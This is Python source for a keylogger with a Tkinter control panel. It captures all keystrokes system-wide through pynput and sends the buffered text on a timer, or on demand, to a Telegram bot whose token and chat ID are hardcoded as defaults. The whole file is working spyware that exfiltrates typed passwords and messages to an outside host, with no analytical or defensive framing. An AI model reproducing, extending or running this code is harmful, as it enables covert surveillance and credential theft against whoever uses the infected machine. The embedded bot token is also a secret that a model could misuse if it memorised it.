from pynput import keyboard
import time
import threading
import requests
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox

# ================= DEFAULT CONFIGURATION =================
DEFAULT_BOT_TOKEN = "9205737340:AAFPu-2Aq6LUAwY9F0amYCyGhfQSvCdm5gU"
DEFAULT_CHAT_ID = "1917196744"
# =========================================================


class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("🔴 Keyboard Logger Control Panel")
        self.root.geometry("720x620")
        self.root.resizable(True, True)

        # State
        self.data = ""
        self.listener = None
        self.sender_thread = None
        self.running = False
        self.lock = threading.Lock()

        self._build_ui()

    # -------------------------------------------------------
    def _build_ui(self):
        style = ttk.Style()
        try:
            style.theme_use("clam")
        except tk.TclError:
            pass

        # --- Telegram config frame ---
        cfg = ttk.LabelFrame(self.root, text="Telegram Configuration", padding=10)
        cfg.pack(fill="x", padx=10, pady=(10, 5))

        ttk.Label(cfg, text="Bot Token:").grid(row=0, column=0, sticky="w", padx=5, pady=3)
        self.token_var = tk.StringVar(value=DEFAULT_BOT_TOKEN)
        ttk.Entry(cfg, textvariable=self.token_var, width=55, show="•").grid(
            row=0, column=1, sticky="we", padx=5, pady=3
        )

        ttk.Label(cfg, text="Chat ID:").grid(row=1, column=0, sticky="w", padx=5, pady=3)
        self.chat_var = tk.StringVar(value=DEFAULT_CHAT_ID)
        ttk.Entry(cfg, textvariable=self.chat_var, width=55).grid(
            row=1, column=1, sticky="we", padx=5, pady=3
        )

        ttk.Label(cfg, text="Auto-send interval (sec):").grid(row=2, column=0, sticky="w", padx=5, pady=3)
        self.interval_var = tk.IntVar(value=20)
        ttk.Spinbox(cfg, from_=5, to=3600, textvariable=self.interval_var, width=10).grid(
            row=2, column=1, sticky="w", padx=5, pady=3
        )

        cfg.columnconfigure(1, weight=1)

        # --- Status frame ---
        status = ttk.Frame(self.root, padding=(10, 5))
        status.pack(fill="x")

        self.status_var = tk.StringVar(value="⚪ Idle — logger not running")
        self.status_label = ttk.Label(status, textvariable=self.status_var, font=("Segoe UI", 10, "bold"))
        self.status_label.pack(side="left")

        self.count_var = tk.StringVar(value="Buffer: 0 chars")
        ttk.Label(status, textvariable=self.count_var).pack(side="right")

        # --- Buttons ---
        btn_frame = ttk.Frame(self.root, padding=(10, 5))
        btn_frame.pack(fill="x")

        self.start_btn = ttk.Button(btn_frame, text="▶ Start Logging", command=self.start_logging)
        self.start_btn.pack(side="left", padx=(0, 5))

        self.stop_btn = ttk.Button(btn_frame, text="■ Stop Logging", command=self.stop_logging, state="disabled")
        self.stop_btn.pack(side="left", padx=5)

        self.send_btn = ttk.Button(btn_frame, text="📤 Send Now", command=self.send_now)
        self.send_btn.pack(side="left", padx=5)

        self.clear_btn = ttk.Button(btn_frame, text="🗑 Clear Buffer", command=self.clear_buffer)
        self.clear_btn.pack(side="left", padx=5)

        self.test_btn = ttk.Button(btn_frame, text="🔍 Test Telegram", command=self.test_telegram)
        self.test_btn.pack(side="left", padx=5)

        # --- Live keystroke view ---
        live = ttk.LabelFrame(self.root, text="Live Keystrokes", padding=8)
        live.pack(fill="both", expand=True, padx=10, pady=(5, 5))

        self.live_text = scrolledtext.ScrolledText(live, height=10, wrap="word",
                                                   font=("Consolas", 10), state="disabled")
        self.live_text.pack(fill="both", expand=True)

        # --- Log ---
        log_frame = ttk.LabelFrame(self.root, text="Event Log", padding=8)
        log_frame.pack(fill="both", expand=True, padx=10, pady=(0, 10))

        self.log_text = scrolledtext.ScrolledText(log_frame, height=7, wrap="word",
                                                  font=("Consolas", 9), state="disabled",
                                                  background="#1e1e1e", foreground="#d4d4d4")
        self.log_text.pack(fill="both", expand=True)

    # -------------------------------------------------------
    # Logging helpers (thread-safe via root.after)
    # -------------------------------------------------------
    def log(self, msg: str):
        def _append():
            ts = time.strftime("%H:%M:%S")
            self.log_text.configure(state="normal")
            self.log_text.insert("end", f"[{ts}] {msg}\n")
            self.log_text.see("end")
            self.log_text.configure(state="disabled")
        self.root.after(0, _append)

    def append_live(self, text: str):
        def _append():
            self.live_text.configure(state="normal")
            self.live_text.insert("end", text)
            self.live_text.see("end")
            self.live_text.configure(state="disabled")
            self._update_count()
        self.root.after(0, _append)

    def _update_count(self):
        with self.lock:
            n = len(self.data)
        self.count_var.set(f"Buffer: {n} chars")

    # -------------------------------------------------------
    # Key capture
    # -------------------------------------------------------
    def _on_press(self, key):
        if not self.running:
            return False  # stop listener
        try:
            ch = key.char
            with self.lock:
                self.data += ch
            self.append_live(ch)
        except AttributeError:
            if key == keyboard.Key.space:
                with self.lock:
                    self.data += " "
                self.append_live(" ")
            elif key == keyboard.Key.enter:
                with self.lock:
                    self.data += "\n"
                self.append_live("\n")
            else:
                token = f" [{str(key)}] "
                with self.lock:
                    self.data += token
                self.append_live(token)

    # -------------------------------------------------------
    # Sender loop
    # -------------------------------------------------------
    def _sender_loop(self):
        while self.running:
            time.sleep(1)
            # sleep in small chunks so Stop responds quickly
            elapsed = 0
            while self.running and elapsed < self.interval_var.get():
                time.sleep(1)
                elapsed += 1
            if not self.running:
                break
            with self.lock:
                payload = self.data
                if payload:
                    self.data = ""
            if payload:
                ok = self._send_telegram(payload)
                self.root.after(0, self._update_count)
                if ok:
                    self.log(f"✅ Auto-sent {len(payload)} chars to Telegram")
                else:
                    self.log("❌ Auto-send failed")

    # -------------------------------------------------------
    # Telegram
    # -------------------------------------------------------
    def _send_telegram(self, message: str) -> bool:
        token = self.token_var.get().strip()
        chat_id = self.chat_var.get().strip()
        if not token or not chat_id:
            self.log("⚠ Bot token or chat ID empty")
            return False
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        try:
            r = requests.post(url, json={"chat_id": chat_id, "text": message}, timeout=10)
            if r.status_code == 200:
                return True
            self.log(f"❌ Telegram error: {r.text[:200]}")
            return False
        except Exception as e:
            self.log(f"❌ Connection failed: {e}")
            return False

    def test_telegram(self):
        self.log("🔍 Sending test message…")
        threading.Thread(
            target=lambda: self._on_test_result(self._send_telegram("🔔 Test message from Keylogger GUI")),
            daemon=True,
        ).start()

    def _on_test_result(self, ok):
        self.root.after(0, lambda: messagebox.showinfo(
            "Telegram Test",
            "✅ Test message sent successfully!" if ok else "❌ Failed — check the event log."
        ))

    def send_now(self):
        with self.lock:
            payload = self.data
            if payload:
                self.data = ""
        if not payload:
            self.log("⚠ Buffer is empty — nothing to send")
            return
        self.log(f"📤 Manually sending {len(payload)} chars…")

        def _worker():
            ok = self._send_telegram(payload)
            if ok:
                self.log("✅ Manual send succeeded")
            else:
                with self.lock:
                    self.data = payload + self.data  # restore on failure
                self.root.after(0, self._update_count)
        threading.Thread(target=_worker, daemon=True).start()

    # -------------------------------------------------------
    # Start / Stop / Clear
    # -------------------------------------------------------
    def start_logging(self):
        if self.running:
            return
        self.running = True
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.status_var.set("🔴 Logging — capturing keystrokes")
        self.status_label.configure(foreground="red")
        self.log("▶ Logger started")

        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

        self.sender_thread = threading.Thread(target=self._sender_loop, daemon=True)
        self.sender_thread.start()

    def stop_logging(self):
        if not self.running:
            return
        self.running = False
        self.status_var.set("⚪ Idle — logger stopped")
        self.status_label.configure(foreground="black")
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        self.log("■ Logger stopped")
        if self.listener:
            try:
                self.listener.stop()
            except Exception:
                pass
            self.listener = None

    def clear_buffer(self):
        with self.lock:
            self.data = ""
        self.live_text.configure(state="normal")
        self.live_text.delete("1.0", "end")
        self.live_text.configure(state="disabled")
        self._update_count()
        self.log("🗑 Buffer cleared")

    # -------------------------------------------------------
    def on_close(self):
        self.running = False
        if self.listener:
            try:
                self.listener.stop()
            except Exception:
                pass
        self.root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()